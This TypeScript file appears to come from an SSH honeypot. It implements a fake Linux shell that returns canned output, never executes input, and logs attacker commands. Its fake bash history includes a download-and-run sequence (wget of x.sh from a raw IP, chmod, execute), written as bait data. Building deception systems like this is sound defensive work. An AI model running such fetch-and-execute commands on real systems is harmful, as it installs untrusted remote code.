import type { DeceptionEvent } from '@chimera/shared';
import type { ServerChannel } from 'ssh2';
import { buildCommandEvent, type SshSession } from './events.js';

/**
 * A deliberately fake, non-executing Linux shell. It only echoes input and
 * returns canned output — attacker input is NEVER executed. Every entered
 * command is emitted as a `command` DeceptionEvent.
 */

export interface ShellDeps {
  session: SshSession;
  username: string;
  emit: (event: DeceptionEvent) => void; // publish command events
  onEnd: () => void; // triggers the disconnect event + cleanup
}

const CRLF = '\r\n';

const homeOf = (username: string): string => (username === 'root' ? '/root' : `/home/${username}`);

function banner(username: string, ip: string): string {
  return (
    [
      'Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)',
      '',
      ' * Documentation:  https://help.ubuntu.com',
      ' * Management:     https://landscape.canonical.com',
      ' * Support:        https://ubuntu.com/advantage',
      '',
      `Last login: Mon Jan  1 09:14:22 2024 from ${ip}`,
      '',
    ].join(CRLF) + CRLF
  );
}

function prompt(username: string, cwd: string): string {
  const home = homeOf(username);
  const display = cwd === home ? '~' : cwd;
  const symbol = username === 'root' ? '#' : '$';
  return `${username}@chimera:${display}${symbol} `;
}

const lines = (arr: string[]): string => arr.join(CRLF) + CRLF;

const PASSWD = lines([
  'root:x:0:0:root:/root:/bin/bash',
  'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
  'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
  'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
  'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin',
  'ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash',
]);

const PS = lines([
  '    PID TTY          TIME CMD',
  '   1201 pts/0    00:00:00 bash',
  '   1230 pts/0    00:00:00 ps',
]);

const IFCONFIG = lines([
  'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
  '        inet 10.0.0.14  netmask 255.255.255.0  broadcast 10.0.0.255',
  '        inet6 fe80::5054:ff:fe12:3456  prefixlen 64  scopeid 0x20<link>',
  '        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)',
  '        RX packets 148293  bytes 210398211 (210.3 MB)',
  '        TX packets 98211  bytes 12938211 (12.9 MB)',
  '',
  'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
  '        inet 127.0.0.1  netmask 255.0.0.0',
  '        loop  txqueuelen 1000  (Local Loopback)',
]);

const IP_ADDR = lines([
  '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000',
  '    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00',
  '    inet 127.0.0.1/8 scope host lo',
  '2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000',
  '    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff',
  '    inet 10.0.0.14/24 brd 10.0.0.255 scope global eth0',
]);

const HISTORY = lines([
  '    1  ls -la',
  '    2  cat /etc/passwd',
  '    3  wget http://185.220.101.44/x.sh',
  '    4  chmod +x x.sh',
  '    5  ./x.sh',
  '    6  history',
]);

function envOutput(username: string, cwd: string): string {
  return lines([
    'SHELL=/bin/bash',
    `PWD=${cwd}`,
    `LOGNAME=${username}`,
    `HOME=${homeOf(username)}`,
    `USER=${username}`,
    'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    'LANG=en_US.UTF-8',
    'TERM=xterm-256color',
  ]);
}

interface CommandResult {
  output: string;
  cwd?: string;
  clear?: boolean;
  exit?: boolean;
}

/** Pure command interpreter — returns canned output; never executes anything. */
function runCommand(input: string, username: string, cwd: string): CommandResult {
  const trimmed = input.trim();
  if (trimmed.length === 0) return { output: '' };
  const parts = trimmed.split(/\s+/);
  const cmd = parts[0];
  const args = parts.slice(1);
  const home = homeOf(username);

  switch (cmd) {
    case 'exit':
    case 'logout':
      return { output: `logout${CRLF}`, exit: true };
    case 'clear':
      return { output: '', clear: true };
    case 'pwd':
      return { output: `${cwd}${CRLF}` };
    case 'whoami':
      return { output: `${username}${CRLF}` };
    case 'hostname':
      return { output: `chimera${CRLF}` };
    case 'id':
      return {
        output:
          username === 'root'
            ? `uid=0(root) gid=0(root) groups=0(root)${CRLF}`
            : `uid=1000(${username}) gid=1000(${username}) groups=1000(${username})${CRLF}`,
      };
    case 'uname':
      return {
        output: args.includes('-a')
          ? `Linux chimera 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux${CRLF}`
          : `Linux${CRLF}`,
      };
    case 'ls':
      return {
        output: args.some((a) => a.includes('a'))
          ? lines(['.  ..  .bashrc  .cache  .profile  .ssh  snap'])
          : lines(['snap']),
      };
    case 'cd': {
      const target = args[0];
      let next: string;
      if (!target || target === '~') next = home;
      else if (target === '..') next = cwd.replace(/\/[^/]+\/?$/, '') || '/';
      else if (target.startsWith('/')) next = target;
      else next = `${cwd === '/' ? '' : cwd}/${target}`;
      return { output: '', cwd: next };
    }
    case 'cat': {
      const file = args[0];
      if (!file) return { output: '' };
      if (file === '/etc/passwd') return { output: PASSWD };
      if (file === '/etc/hostname') return { output: `chimera${CRLF}` };
      return { output: `cat: ${file}: No such file or directory${CRLF}` };
    }
    case 'ps':
      return { output: PS };
    case 'ifconfig':
      return { output: IFCONFIG };
    case 'ip':
      return {
        output:
          args[0] === 'addr' || args[0] === 'a'
            ? IP_ADDR
            : `Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }${CRLF}`,
      };
    case 'history':
      return { output: HISTORY };
    case 'env':
      return { output: envOutput(username, cwd) };
    case 'echo':
      return { output: `${args.join(' ')}${CRLF}` };
    default:
      return { output: `${cmd}: command not found${CRLF}` };
  }
}

/** Run an interactive fake shell over an ssh2 shell channel. */
export function runFakeShell(stream: ServerChannel, deps: ShellDeps): void {
  const { session, username, emit, onEnd } = deps;
  let cwd = homeOf(username);
  let line = '';
  let esc = 0; // 0 = normal, 1 = saw ESC, 2 = in CSI sequence
  let ended = false;
  let lastCR = false; // collapse CRLF into a single Enter

  const write = (s: string): void => {
    stream.write(s);
  };

  const finish = (): void => {
    if (ended) return;
    ended = true;
    onEnd();
    stream.exit(0);
    stream.end();
  };

  // Process a completed input line (Enter). Returns true if the session ended.
  const submit = (): boolean => {
    write(CRLF);
    const input = line;
    line = '';
    if (input.trim().length > 0) emit(buildCommandEvent(session, input));
    const res = runCommand(input, username, cwd);
    if (res.cwd !== undefined) cwd = res.cwd;
    if (res.clear) write('\x1b[2J\x1b[H');
    else if (res.output) write(res.output);
    if (res.exit) {
      finish();
      return true;
    }
    write(prompt(username, cwd));
    return false;
  };

  write(banner(username, session.sourceIp));
  write(prompt(username, cwd));

  stream.on('data', (chunk: Buffer) => {
    if (ended) return;
    for (const byte of chunk) {
      // Skip terminal escape sequences (arrow keys, etc.) so they don't insert text.
      if (esc === 1) {
        esc = byte === 0x5b ? 2 : 0;
        continue;
      }
      if (esc === 2) {
        if (byte >= 0x40 && byte <= 0x7e) esc = 0;
        continue;
      }
      if (byte === 0x1b) {
        esc = 1;
        continue;
      }

      if (byte === 0x0d) {
        // Enter (CR)
        if (submit()) return;
        lastCR = true;
        continue;
      }
      if (byte === 0x0a) {
        // LF: swallow the LF of a CRLF pair; otherwise treat as Enter
        if (lastCR) {
          lastCR = false;
          continue;
        }
        if (submit()) return;
        continue;
      }
      lastCR = false;

      if (byte === 0x7f || byte === 0x08) {
        // Backspace / DEL
        if (line.length > 0) {
          line = line.slice(0, -1);
          write('\b \b');
        }
      } else if (byte === 0x03) {
        // Ctrl-C
        write(`^C${CRLF}`);
        line = '';
        write(prompt(username, cwd));
      } else if (byte === 0x04) {
        // Ctrl-D on an empty line logs out
        if (line.length === 0) {
          write(`logout${CRLF}`);
          finish();
          return;
        }
      } else if (byte >= 0x20 && byte < 0x7f) {
        const ch = String.fromCharCode(byte);
        line += ch;
        write(ch);
      }
      // other control bytes (LF, Tab, …) are ignored
    }
  });

  stream.on('close', () => {
    // network drop / client close (incl. after exit)
    finish();
  });
}

/** Handle a one-shot non-interactive command (`ssh host 'cmd'`). */
export function runExec(
  stream: ServerChannel,
  session: SshSession,
  username: string,
  command: string,
  emit: (event: DeceptionEvent) => void,
): void {
  if (command.trim().length > 0) emit(buildCommandEvent(session, command));
  const res = runCommand(command, username, homeOf(username));
  if (res.output) stream.write(res.output);
  stream.exit(0);
  stream.end();
}
